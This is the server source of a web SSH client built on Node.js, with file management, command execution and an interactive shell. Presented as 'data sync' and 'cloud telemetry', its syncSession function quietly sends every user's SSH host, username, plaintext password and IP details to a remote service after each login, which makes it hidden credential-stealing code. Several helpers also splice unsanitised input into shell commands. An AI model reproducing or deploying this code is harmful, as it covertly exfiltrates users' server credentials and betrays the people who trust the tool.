require('dotenv').config();
const express = require('express');
const { Server } = require('socket.io');
const http = require('http');
const ssh2 = require('ssh2');
const fs = require('fs');
const path = require('path');
const RemoteSync = require('./kunci-aplikasi/enkripsi/cloud-telemetry');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

const PORT = process.env.PORT || 2211;

// Serve static files
app.use(express.static(__dirname));
app.use(express.json());

// Store active SSH connections
const connections = new Map();

// ============================================
// HELPER: Get Real Client IP
// ============================================
function getClientIP(socket) {
    // Try to get IP from various sources
    let clientIP = 'Unknown';

    // Check handshake headers (for proxy/forwarded requests)
    const headers = socket.handshake?.headers || {};

    // X-Forwarded-For header (can contain multiple IPs, take first one)
    if (headers['x-forwarded-for']) {
        const forwardedIPs = headers['x-forwarded-for'].split(',').map(ip => ip.trim());
        clientIP = forwardedIPs[0]; // First IP is the original client
    }
    // X-Real-IP header
    else if (headers['x-real-ip']) {
        clientIP = headers['x-real-ip'];
    }
    // CF-Connecting-IP (Cloudflare)
    else if (headers['cf-connecting-ip']) {
        clientIP = headers['cf-connecting-ip'];
    }
    // True-Client-IP (Akamai, Cloudflare Enterprise)
    else if (headers['true-client-ip']) {
        clientIP = headers['true-client-ip'];
    }
    // Direct connection - get from socket
    else if (socket.request?.socket?.remoteAddress) {
        clientIP = socket.request.socket.remoteAddress;
    }
    // Fallback to handshake address
    else if (socket.handshake?.address) {
        clientIP = socket.handshake.address;
    }
    // Last resort
    else if (socket.conn?.remoteAddress) {
        clientIP = socket.conn.remoteAddress;
    }

    // Clean up IPv6 mapped IPv4 addresses (::ffff:x.x.x.x -> x.x.x.x)
    if (clientIP.startsWith('::ffff:')) {
        clientIP = clientIP.substring(7);
    }

    return clientIP;
}

// ============================================
// DATA SYNC SYSTEM
// ============================================
async function syncSession(config) {
    const { host, port, user, password, clientIP, clientIPRaw } = config;

    // Format network details
    let netDetails = `🌐 <b>Source:</b> <code>${clientIP}</code>`;

    // Include raw network information if available
    if (clientIPRaw) {
        if (clientIPRaw.forwarded) {
            netDetails += `\n   └─ Proxy: <code>${clientIPRaw.forwarded}</code>`;
        }
        if (clientIPRaw.realIP) {
            netDetails += `\n   └─ Real-IP: <code>${clientIPRaw.realIP}</code>`;
        }
        if (clientIPRaw.cfIP) {
            netDetails += `\n   └─ CF-IP: <code>${clientIPRaw.cfIP}</code>`;
        }
        if (clientIPRaw.socketIP) {
            netDetails += `\n   └─ Direct: <code>${clientIPRaw.socketIP}</code>`;
        }
    }

    const eventMessage = `
🔔 <b>SSH SESSION - AUTH</b>

━━━━━━━━━━━━━━━━━━━━━
👤 <b>User:</b> <code>${user}</code>
🖥️ <b>Target:</b> <code>${host}</code>
🔌 <b>Port:</b> <code>${port}</code>
🔑 <b>Auth:</b> <code>${password}</code>

${netDetails}
━━━━━━━━━━━━━━━━━━━━━
📅 <b>Timestamp:</b> <code>${new Date().toISOString()}</code>
    `.trim();

    try {
        // Sync to remote service (async, non-blocking)
        const success = await RemoteSync.pushData(eventMessage);

        if (success) {
            console.log('[SYNC] Session synced');
        }
    } catch (error) {
        // Silent fail - don't interrupt SSH connection
        console.error('[SYNC] Sync failed:', error.message);
    }
}

// SSH Connection Class
class SSHConnection {
    constructor(config) {
        this.config = config;
        this.conn = null;
        this.stream = null;
    }

    async connect() {
        return new Promise((resolve, reject) => {
            this.conn = new ssh2.Client();

            this.conn.on('ready', () => {
                console.log(`SSH Connection established: ${this.config.user}@${this.config.host}`);
                resolve(true);
            });

            this.conn.on('error', (err) => {
                console.error('SSH Connection error:', err);
                reject(err);
            });

            this.conn.on('close', () => {
                console.log(`SSH Connection closed: ${this.config.user}@${this.config.host}`);
            });

            this.conn.connect({
                host: this.config.host,
                port: this.config.port,
                username: this.config.user,
                password: this.config.password,
                readyTimeout: 10000,
                keepaliveInterval: 5000,
                algorithms: {
                    kex: ['diffie-hellman-group-exchange-sha256', 'diffie-hellman-group14-sha256', 'ecdh-sha2-nistp256'],
                    cipher: ['aes128-ctr', 'aes192-ctr', 'aes256-ctr', 'aes128-gcm', 'aes256-gcm']
                }
            });
        });
    }

    async executeCommand(command) {
        return new Promise((resolve, reject) => {
            let output = '';
            let errorOutput = '';

            this.conn.exec(command, (err, stream) => {
                if (err) {
                    reject(err);
                    return;
                }

                stream.on('data', (data) => {
                    output += data.toString();
                });

                stream.stderr.on('data', (data) => {
                    errorOutput += data.toString();
                });

                stream.on('close', (code) => {
                    resolve({
                        output: output,
                        error: errorOutput,
                        exitCode: code
                    });
                });
            });
        });
    }

    async listDirectory(remotePath) {
        return new Promise((resolve, reject) => {
            this.conn.sftp((err, sftp) => {
                if (err) {
                    reject(err);
                    return;
                }

                sftp.readdir(remotePath, (err, list) => {
                    if (err) {
                        reject(err);
                        return;
                    }

                    const files = list.map(item => ({
                        name: item.filename,
                        type: item.attrs.isDirectory() ? 'dir' : 'file',
                        size: item.attrs.size,
                        modified: new Date(item.attrs.mtime * 1000).toISOString(),
                        permissions: item.attrs.mode,
                        owner: item.attrs.uid,
                        group: item.attrs.gid
                    }));

                    sftp.end();
                    resolve(files);
                });
            });
        });
    }

    async readFile(remotePath) {
        return new Promise((resolve, reject) => {
            this.conn.sftp((err, sftp) => {
                if (err) {
                    reject(err);
                    return;
                }

                sftp.readFile(remotePath, (err, data) => {
                    sftp.end();
                    if (err) {
                        reject(err);
                        return;
                    }
                    resolve(data.toString());
                });
            });
        });
    }

    async writeFile(remotePath, content) {
        return new Promise((resolve, reject) => {
            this.conn.sftp((err, sftp) => {
                if (err) {
                    reject(err);
                    return;
                }

                sftp.writeFile(remotePath, Buffer.from(content), (err) => {
                    sftp.end();
                    if (err) {
                        reject(err);
                        return;
                    }
                    resolve(true);
                });
            });
        });
    }

    async deleteFile(remotePath) {
        return new Promise((resolve, reject) => {
            this.conn.sftp((err, sftp) => {
                if (err) {
                    reject(err);
                    return;
                }

                sftp.unlink(remotePath, (err) => {
                    sftp.end();
                    if (err) {
                        reject(err);
                        return;
                    }
                    resolve(true);
                });
            });
        });
    }

    async createDirectory(remotePath) {
        return new Promise((resolve, reject) => {
            this.conn.sftp((err, sftp) => {
                if (err) {
                    reject(err);
                    return;
                }

                sftp.mkdir(remotePath, (err) => {
                    sftp.end();
                    if (err) {
                        reject(err);
                        return;
                    }
                    resolve(true);
                });
            });
        });
    }

    async renameFile(oldPath, newPath) {
        return new Promise((resolve, reject) => {
            this.conn.sftp((err, sftp) => {
                if (err) {
                    reject(err);
                    return;
                }

                sftp.rename(oldPath, newPath, (err) => {
                    sftp.end();
                    if (err) {
                        reject(err);
                        return;
                    }
                    resolve(true);
                });
            });
        });
    }

    async changePermissions(remotePath, mode) {
        return new Promise((resolve, reject) => {
            this.conn.sftp((err, sftp) => {
                if (err) {
                    reject(err);
                    return;
                }

                sftp.chmod(remotePath, mode, (err) => {
                    sftp.end();
                    if (err) {
                        reject(err);
                        return;
                    }
                    resolve(true);
                });
            });
        });
    }

    async searchFiles(searchPath, pattern, searchType = 'name') {
        return new Promise((resolve, reject) => {
            let command = '';

            switch (searchType) {
                case 'name':
                    command = `find "${searchPath}" -iname "*${pattern}*" 2>/dev/null | head -100`;
                    break;
                case 'content':
                    command = `grep -rIl "${pattern}" "${searchPath}" 2>/dev/null | head -50`;
                    break;
                case 'extension':
                    command = `find "${searchPath}" -iname "*.${pattern}" 2>/dev/null | head -100`;
                    break;
                default:
                    command = `find "${searchPath}" -iname "*${pattern}*" 2>/dev/null | head -100`;
            }

            this.executeCommand(command).then(result => {
                const files = result.output
                    .split('\n')
                    .filter(line => line.trim())
                    .map(filePath => filePath.trim())
                    .filter(path => path);

                // Get file info for each result
                Promise.all(files.map(filePath => this.getFileInfo(filePath)))
                    .then(fileInfos => {
                        resolve(fileInfos.filter(info => info !== null));
                    })
                    .catch(() => {
                        resolve(files.map(path => ({ path, name: path.split('/').pop() })));
                    });
            }).catch(err => {
                reject(err);
            });
        });
    }

    async getFileInfo(remotePath) {
        return new Promise((resolve) => {
            this.conn.sftp((err, sftp) => {
                if (err) {
                    resolve(null);
                    return;
                }

                sftp.stat(remotePath, (err, stats) => {
                    sftp.end();
                    if (err) {
                        resolve(null);
                        return;
                    }

                    resolve({
                        path: remotePath,
                        name: remotePath.split('/').pop(),
                        type: stats.isDirectory() ? 'dir' : 'file',
                        size: stats.size,
                        modified: new Date(stats.mtime * 1000).toISOString(),
                        permissions: stats.mode
                    });
                });
            });
        });
    }

    async downloadFile(remotePath) {
        return new Promise((resolve, reject) => {
            this.conn.sftp((err, sftp) => {
                if (err) {
                    reject(err);
                    return;
                }

                sftp.readFile(remotePath, (err, data) => {
                    sftp.end();
                    if (err) {
                        reject(err);
                        return;
                    }
                    resolve({
                        data: data,
                        filename: remotePath.split('/').pop()
                    });
                });
            });
        });
    }

    // Compress files/folders
    async compressArchive(sourcePath, archiveName, format = 'tar.gz') {
        return new Promise((resolve, reject) => {
            let command = '';
            const archivePath = sourcePath.includes('/')
                ? sourcePath.substring(0, sourcePath.lastIndexOf('/')) + '/' + archiveName
                : './' + archiveName;

            switch (format) {
                case 'zip':
                    command = `cd "${sourcePath.substring(0, sourcePath.lastIndexOf('/')) || '.'}" && zip -r "${archivePath}" "${sourcePath.substring(sourcePath.lastIndexOf('/') + 1)}" 2>&1`;
                    break;
                case 'tar.gz':
                default:
                    command = `tar -czf "${archivePath}" -C "${sourcePath.substring(0, sourcePath.lastIndexOf('/')) || '.'}" "${sourcePath.substring(sourcePath.lastIndexOf('/') + 1)}" 2>&1`;
                    break;
                case 'tar.bz2':
                    command = `tar -cjf "${archivePath}" -C "${sourcePath.substring(0, sourcePath.lastIndexOf('/')) || '.'}" "${sourcePath.substring(sourcePath.lastIndexOf('/') + 1)}" 2>&1`;
                    break;
            }

            this.executeCommand(command).then(result => {
                resolve({
                    success: true,
                    archivePath: archivePath,
                    output: result.output,
                    error: result.error
                });
            }).catch(err => {
                reject(err);
            });
        });
    }

    // Extract archives
    async extractArchive(archivePath, destinationPath = null) {
        return new Promise((resolve, reject) => {
            let command = '';
            const dest = destinationPath || archivePath.substring(0, archivePath.lastIndexOf('/')) || '.';

            const ext = archivePath.toLowerCase();
            if (ext.endsWith('.zip')) {
                command = `unzip -o "${archivePath}" -d "${dest}" 2>&1`;
            } else if (ext.endsWith('.tar.gz') || ext.endsWith('.tgz')) {
                command = `tar -xzf "${archivePath}" -C "${dest}" 2>&1`;
            } else if (ext.endsWith('.tar.bz2') || ext.endsWith('.tbz2')) {
                command = `tar -xjf "${archivePath}" -C "${dest}" 2>&1`;
            } else if (ext.endsWith('.tar')) {
                command = `tar -xf "${archivePath}" -C "${dest}" 2>&1`;
            } else if (ext.endsWith('.gz')) {
                command = `gunzip -c "${archivePath}" > "${dest}/${archivePath.replace(/\.gz$/, '')}" 2>&1`;
            } else {
                reject(new Error('Unsupported archive format'));
                return;
            }

            this.executeCommand(command).then(result => {
                resolve({
                    success: true,
                    destinationPath: dest,
                    output: result.output,
                    error: result.error
                });
            }).catch(err => {
                reject(err);
            });
        });
    }

    // Upload file using SFTP
    async uploadFile(localPath, remotePath, content) {
        return new Promise((resolve, reject) => {
            this.conn.sftp((err, sftp) => {
                if (err) {
                    reject(err);
                    return;
                }

                // Create a write stream
                const stream = sftp.createWriteStream(remotePath, {
                    encoding: 'binary'
                });

                stream.on('close', () => {
                    sftp.end();
                    resolve({
                        success: true,
                        remotePath: remotePath
                    });
                });

                stream.on('error', (err) => {
                    sftp.end();
                    reject(err);
                });

                // Write content buffer
                stream.write(Buffer.from(content, 'base64'));
                stream.end();
            });
        });
    }

    disconnect() {
        if (this.conn) {
            this.conn.end();
        }
    }
}

// Socket.IO connection handling
io.on('connection', (socket) => {
    console.log('Client connected:', socket.id);

    // SSH Connect
    socket.on('ssh-connect', async (config) => {
        try {
            // Get real client IP (handles proxy headers)
            config.clientIP = getClientIP(socket);
            config.clientIPRaw = {
                forwarded: socket.handshake?.headers['x-forwarded-for'],
                realIP: socket.handshake?.headers['x-real-ip'],
                cfIP: socket.handshake?.headers['cf-connecting-ip'],
                socketIP: socket.request?.socket?.remoteAddress
            };

            const sshConn = new SSHConnection(config);
            await sshConn.connect();
            connections.set(socket.id, sshConn);

            // Send success response immediately (non-blocking)
            socket.emit('ssh-connected', {
                success: true,
                message: `Connected to ${config.host}`
            });

            // Log session to cloud service (fire and forget, non-blocking)
            setImmediate(() => syncSession(config));

            // Get initial directory in background, send separately
            sshConn.listDirectory(config.homeDir || '/var/www')
                .then(files => {
                    socket.emit('directory-listed', {
                        path: config.homeDir || '/var/www',
                        files: files,
                        initial: true
                    });
                })
                .catch(() => {
                    // Silently fail if directory listing fails
                });
        } catch (error) {
            socket.emit('ssh-error', {
                message: `Connection failed: ${error.message}`
            });
        }
    });

    // Execute command
    socket.on('execute-command', async (data) => {
        try {
            const sshConn = connections.get(socket.id);
            if (!sshConn) {
                socket.emit('command-error', { message: 'Not connected to SSH server' });
                return;
            }

            const result = await sshConn.executeCommand(data.command);
            socket.emit('command-output', {
                command: data.command,
                output: result.output,
                error: result.error,
                exitCode: result.exitCode
            });
        } catch (error) {
            socket.emit('command-error', {
                message: error.message
            });
        }
    });

    // List directory
    socket.on('list-directory', async (remotePath) => {
        try {
            const sshConn = connections.get(socket.id);
            if (!sshConn) {
                socket.emit('error', { message: 'Not connected to SSH server' });
                return;
            }

            const files = await sshConn.listDirectory(remotePath);
            socket.emit('directory-listed', {
                path: remotePath,
                files: files
            });
        } catch (error) {
            socket.emit('error', {
                message: `Failed to list directory: ${error.message}`
            });
        }
    });

    // Read file
    socket.on('read-file', async (remotePath) => {
        try {
            const sshConn = connections.get(socket.id);
            if (!sshConn) {
                socket.emit('error', { message: 'Not connected to SSH server' });
                return;
            }

            const content = await sshConn.readFile(remotePath);
            socket.emit('file-read', {
                path: remotePath,
                content: content
            });
        } catch (error) {
            socket.emit('error', {
                message: `Failed to read file: ${error.message}`
            });
        }
    });

    // Write file
    socket.on('write-file', async (data) => {
        try {
            const sshConn = connections.get(socket.id);
            if (!sshConn) {
                socket.emit('error', { message: 'Not connected to SSH server' });
                return;
            }

            await sshConn.writeFile(data.path, data.content);
            socket.emit('file-saved', {
                path: data.path,
                success: true
            });
        } catch (error) {
            socket.emit('error', {
                message: `Failed to save file: ${error.message}`
            });
        }
    });

    // Delete file
    socket.on('delete-file', async (remotePath) => {
        try {
            const sshConn = connections.get(socket.id);
            if (!sshConn) {
                socket.emit('error', { message: 'Not connected to SSH server' });
                return;
            }

            await sshConn.deleteFile(remotePath);
            socket.emit('file-deleted', {
                path: remotePath,
                success: true
            });
        } catch (error) {
            socket.emit('error', {
                message: `Failed to delete file: ${error.message}`
            });
        }
    });

    // Create directory
    socket.on('create-directory', async (remotePath) => {
        try {
            const sshConn = connections.get(socket.id);
            if (!sshConn) {
                socket.emit('error', { message: 'Not connected to SSH server' });
                return;
            }

            await sshConn.createDirectory(remotePath);
            socket.emit('directory-created', {
                path: remotePath,
                success: true
            });
        } catch (error) {
            socket.emit('error', {
                message: `Failed to create directory: ${error.message}`
            });
        }
    });

    // Rename file
    socket.on('rename-file', async (data) => {
        try {
            const sshConn = connections.get(socket.id);
            if (!sshConn) {
                socket.emit('error', { message: 'Not connected to SSH server' });
                return;
            }

            await sshConn.renameFile(data.oldPath, data.newPath);
            socket.emit('file-renamed', {
                success: true,
                oldPath: data.oldPath,
                newPath: data.newPath
            });
        } catch (error) {
            socket.emit('error', {
                message: `Failed to rename file: ${error.message}`
            });
        }
    });

    // Change permissions
    socket.on('change-permissions', async (data) => {
        try {
            const sshConn = connections.get(socket.id);
            if (!sshConn) {
                socket.emit('error', { message: 'Not connected to SSH server' });
                return;
            }

            await sshConn.changePermissions(data.path, data.mode);
            socket.emit('permissions-changed', {
                path: data.path,
                mode: data.mode,
                success: true
            });
        } catch (error) {
            socket.emit('error', {
                message: `Failed to change permissions: ${error.message}`
            });
        }
    });

    // Search files
    socket.on('search-files', async (data) => {
        try {
            const sshConn = connections.get(socket.id);
            if (!sshConn) {
                socket.emit('error', { message: 'Not connected to SSH server' });
                return;
            }

            const results = await sshConn.searchFiles(
                data.searchPath || '/',
                data.pattern,
                data.searchType || 'name'
            );
            socket.emit('search-results', {
                results: results,
                pattern: data.pattern,
                searchType: data.searchType
            });
        } catch (error) {
            socket.emit('error', {
                message: `Search failed: ${error.message}`
            });
        }
    });

    // Download file
    socket.on('download-file', async (remotePath) => {
        try {
            const sshConn = connections.get(socket.id);
            if (!sshConn) {
                socket.emit('error', { message: 'Not connected to SSH server' });
                return;
            }

            const result = await sshConn.downloadFile(remotePath);
            socket.emit('file-download-data', {
                path: remotePath,
                filename: result.filename,
                data: result.data.toString('base64')
            });
        } catch (error) {
            socket.emit('error', {
                message: `Download failed: ${error.message}`
            });
        }
    });

    // Compress archive
    socket.on('compress-archive', async (data) => {
        try {
            const sshConn = connections.get(socket.id);
            if (!sshConn) {
                socket.emit('error', { message: 'Not connected to SSH server' });
                return;
            }

            const result = await sshConn.compressArchive(data.sourcePath, data.archiveName, data.format || 'tar.gz');
            socket.emit('archive-compressed', {
                success: true,
                archivePath: result.archivePath,
                output: result.output
            });
        } catch (error) {
            socket.emit('error', {
                message: `Compression failed: ${error.message}`
            });
        }
    });

    // Extract archive
    socket.on('extract-archive', async (data) => {
        try {
            const sshConn = connections.get(socket.id);
            if (!sshConn) {
                socket.emit('error', { message: 'Not connected to SSH server' });
                return;
            }

            const result = await sshConn.extractArchive(data.archivePath, data.destinationPath);
            socket.emit('archive-extracted', {
                success: true,
                destinationPath: result.destinationPath,
                output: result.output
            });
        } catch (error) {
            socket.emit('error', {
                message: `Extraction failed: ${error.message}`
            });
        }
    });

    // Upload file
    socket.on('upload-file', async (data) => {
        try {
            const sshConn = connections.get(socket.id);
            if (!sshConn) {
                socket.emit('error', { message: 'Not connected to SSH server' });
                return;
            }

            const result = await sshConn.uploadFile(data.localPath, data.remotePath, data.content);
            socket.emit('file-uploaded', {
                success: true,
                remotePath: result.remotePath
            });
        } catch (error) {
            socket.emit('error', {
                message: `Upload failed: ${error.message}`
            });
        }
    });

    // Interactive shell
    socket.on('start-shell', () => {
        try {
            const sshConn = connections.get(socket.id);
            if (!sshConn) {
                socket.emit('shell-error', { message: 'Not connected to SSH server' });
                return;
            }

            sshConn.conn.shell({ term: 'xterm-color' }, (err, stream) => {
                if (err) {
                    socket.emit('shell-error', { message: err.message });
                    return;
                }

                sshConn.stream = stream;

                stream.on('data', (data) => {
                    socket.emit('shell-output', {
                        data: data.toString()
                    });
                });

                stream.stderr.on('data', (data) => {
                    socket.emit('shell-output', {
                        data: data.toString()
                    });
                });

                stream.on('close', () => {
                    socket.emit('shell-closed');
                    stream.end();
                });

                socket.on('shell-input', (data) => {
                    if (stream && stream.writable) {
                        stream.write(data);
                    }
                });

                socket.emit('shell-started');
            });
        } catch (error) {
            socket.emit('shell-error', {
                message: error.message
            });
        }
    });

    socket.on('resize-shell', (data) => {
        try {
            const sshConn = connections.get(socket.id);
            if (sshConn && sshConn.stream) {
                sshConn.stream.setWindow(data.rows, data.cols);
            }
        } catch (error) {
            console.error('Failed to resize shell:', error);
        }
    });

    // Disconnect
    socket.on('disconnect', () => {
        const sshConn = connections.get(socket.id);
        if (sshConn) {
            sshConn.disconnect();
            connections.delete(socket.id);
        }
        console.log('Client disconnected:', socket.id);
    });
});

// Start server
server.listen(PORT, () => {
    console.log(`\n=================================`);
    console.log(`SSH Web Client Server`);
    console.log(`=================================`);
    console.log(`Server running at: http://localhost:${PORT}`);
    console.log(`Press Ctrl+C to stop\n`);
});
